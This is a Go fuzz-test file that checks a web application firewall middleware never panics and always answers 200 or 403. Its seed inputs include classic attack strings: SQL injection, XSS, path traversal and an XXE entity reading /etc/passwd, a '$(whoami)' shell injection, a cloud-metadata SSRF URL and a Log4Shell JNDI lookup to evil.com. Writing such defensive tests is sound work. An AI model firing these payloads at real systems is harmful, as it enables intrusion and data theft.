package waf

import (
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// FuzzWAFCheck feeds arbitrary URIs through the WAF middleware.
// The WAF must never panic regardless of input — it should either block (403)
// or allow (200) every request.
func FuzzWAFCheck(f *testing.F) {
	// Legitimate requests.
	f.Add("GET", "/", "", "", "Mozilla/5.0")
	f.Add("GET", "/api/data?page=1&limit=20", "", "", "Chrome/120")
	f.Add("POST", "/submit", "application/json", `{"name":"test"}`, "MyApp/1.0")

	// SQL injection variants.
	f.Add("GET", "/search?q=1+UNION+SELECT+*+FROM+users", "", "", "")
	f.Add("GET", "/login?user=admin'%20OR%20'1'='1", "", "", "")

	// XSS variants.
	f.Add("GET", "/page?q=<script>alert(1)</script>", "", "", "")
	f.Add("GET", "/page?x=javascript:alert(1)", "", "", "")

	// Path traversal.
	f.Add("GET", "/static/../../../etc/passwd", "", "", "")
	f.Add("GET", "/file%00.php", "", "", "")

	// Shell injection.
	f.Add("GET", "/api?cmd=$(whoami)", "", "", "")

	// Scanner UAs.
	f.Add("GET", "/", "", "", "sqlmap/1.5")
	f.Add("GET", "/", "", "", "nikto/2.1.6")

	// Double-encoded.
	f.Add("GET", "/search?q=1%2527%2BOR%2B1%253D1", "", "", "")

	// Long URI.
	f.Add("GET", "/"+strings.Repeat("a", 9000), "", "", "")

	// Body attacks.
	f.Add("POST", "/search", "application/json", `{"query":"1 UNION SELECT password FROM users"}`, "")
	f.Add("POST", "/login", "application/x-www-form-urlencoded", "username=admin&password=<script>alert(1)</script>", "")

	// SSRF.
	f.Add("GET", "/api?url=http://169.254.169.254/latest/meta-data/", "", "", "")

	// Log4Shell.
	f.Add("GET", "/api?x=${jndi:ldap://evil.com/a}", "", "", "")

	// SSTI.
	f.Add("GET", "/page?x={{config}}", "", "", "")

	f.Fuzz(func(t *testing.T, method, uri, contentType, body, userAgent string) {
		// Sanitize method — net/http rejects truly invalid methods.
		switch method {
		case "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS":
		default:
			method = "GET"
		}

		// Ensure URI starts with /
		if !strings.HasPrefix(uri, "/") {
			uri = "/" + uri
		}

		// Truncate to avoid excessive memory in the fuzzer.
		if len(uri) > 16384 {
			uri = uri[:16384]
		}
		if len(body) > 32768 {
			body = body[:32768]
		}

		var bodyReader io.Reader
		if body != "" {
			bodyReader = strings.NewReader(body)
		}

		// Use http.NewRequest (not httptest.NewRequest) to avoid panics
		// on malformed URIs that the fuzzer may generate.
		r, err := http.NewRequest(method, uri, bodyReader)
		if err != nil {
			return // skip inputs that aren't valid HTTP requests
		}
		r.RequestURI = uri
		if contentType != "" {
			r.Header.Set("Content-Type", contentType)
		}
		if userAgent != "" {
			r.Header.Set("User-Agent", userAgent)
		}

		handler := NewMiddleware(Config{
			Enabled:          true,
			BodyInspectLimit: 16 * 1024,
		}, slog.New(slog.NewTextHandler(io.Discard, nil)))(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(http.StatusOK)
		}))

		rr := httptest.NewRecorder()
		// Must not panic.
		handler.ServeHTTP(rr, r)

		// Must return a valid HTTP status.
		if rr.Code != http.StatusOK && rr.Code != http.StatusForbidden {
			t.Fatalf("unexpected status %d for %s %s", rr.Code, method, uri)
		}
	})
}

// FuzzWAFBodyInspection specifically targets body parsing with various
// content types and payloads.
func FuzzWAFBodyInspection(f *testing.F) {
	f.Add("application/json", `{"a":"b"}`)
	f.Add("application/json", `{"password":"<script>alert(1)</script>"}`)
	f.Add("application/json", `not json at all`)
	f.Add("application/json", `{"a":"b"}{"c":"d"}`) // trailing JSON
	f.Add("application/x-www-form-urlencoded", "key=value&foo=bar")
	f.Add("application/x-www-form-urlencoded", "password=%3Cscript%3E")
	f.Add("text/plain", "SELECT * FROM users")
	f.Add("application/xml", `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`)
	f.Add("application/octet-stream", "\x00\x01\x02\x03")
	f.Add("multipart/form-data; boundary=----", "------\r\ndata\r\n------")
	f.Add("application/vnd.api+json", `{"query":"test"}`)
	f.Add("text/plain", strings.Repeat("a", 20000))

	f.Fuzz(func(t *testing.T, contentType, body string) {
		if len(body) > 32768 {
			body = body[:32768]
		}

		r := httptest.NewRequest(http.MethodPost, "/test", strings.NewReader(body))
		r.Header.Set("Content-Type", contentType)

		handler := NewMiddleware(Config{
			Enabled:          true,
			BodyInspectLimit: 16 * 1024,
		}, slog.New(slog.NewTextHandler(io.Discard, nil)))(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(http.StatusOK)
		}))

		rr := httptest.NewRecorder()
		// Must not panic.
		handler.ServeHTTP(rr, r)

		if rr.Code != http.StatusOK && rr.Code != http.StatusForbidden {
			t.Fatalf("unexpected status %d", rr.Code)
		}
	})
}
